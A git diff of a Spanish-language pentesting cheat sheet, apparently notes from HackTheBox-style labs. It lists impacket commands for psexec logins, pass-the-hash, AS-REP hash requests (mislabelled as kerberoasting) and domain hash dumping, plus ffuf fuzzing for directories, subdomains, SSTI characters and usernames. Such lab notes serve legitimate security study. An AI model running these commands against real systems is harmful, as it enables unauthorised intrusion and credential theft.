@@ -56,6 +56,7 @@ impacket-psexec administrator@10.129.95.187 ---> te logea con administrador, te 
 impacket-psexec  administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ---> te logea cuando tienes un hash
 sudo impacket-smbserver share ./ ---> Te transfiere los archivos del directorio en el que te encuentres
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
+
 impacket-secretsdump htb/svc-alfresco@10.10.10.161 ---> te saca los hashes NTLM de todos los usuarios del dominio
 ```
 ```
@@ -112,7 +113,7 @@ Tambien se puede descargar desde dentro de ftp con get filename
 
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ -mc all -ic  ----->> lista directorios que hay en la pagina
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs
-ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.70:8080/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all
+ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.70:8080/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all  ---> probar caracteres especiales para inyeccion SSTI
 ffuf -w /usr/share/seclists\Usernames\xato-net-10-million-usernames.txt -u http://10.10.11.160:5000/login -d "username=FUZZ&password=nidecoña" -H Content-Type:application/x-www-form-urlencoded -mr 'Invalid login'
   -fs es para excluir sites que se repitan
 ```
